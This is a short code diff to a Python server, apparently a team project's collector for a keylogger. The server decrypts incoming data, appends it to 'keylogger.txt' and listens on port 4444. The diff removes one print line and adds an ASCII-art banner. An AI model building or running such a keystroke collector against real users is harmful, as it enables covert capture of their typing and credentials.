@@ -32,7 +32,6 @@ class Server():
                      # decode_msg = data.decode('utf-8')
                      print(f'Raw data: {data}')
                      decode_msg = self.__crypt.decrypt(data).decode('utf-8')
-                     print(f"{decode_msg}", end='')
 
                      with open("keylogger.txt", 'a') as f:
 
@@ -81,7 +80,18 @@ class Server():
             sys.exit(0)
 
 if __name__ == '__main__':
-  
+
+   print("""
+     ▄▄▄▄▄              ▄▄▄                 
+    ██▀▀▀▀█▄           █▀██  ██             
+ ▀▀ ▀██▄  ▄▀             ██  ██             
+ ██   ▀██▄▄  ▄█▀█▄ ▄█▀█▄ ██  ██  ▄███▄ ██ ██
+ ██ ▄   ▀██▄ ██▄█▀ ██▄█▀ ██  ██  ██ ██ ██ ██
+▄██ ▀██████▀▄▀█▄▄▄▄▀█▄▄▄ ▀█████▄▄▀███▀▄▀██▀█
+                         ▄   ██             
+                         ▀████▀             """)
+   print("==== G2, Team2 ====")
+
    Host = "0.0.0.0"
    Port = 4444
 
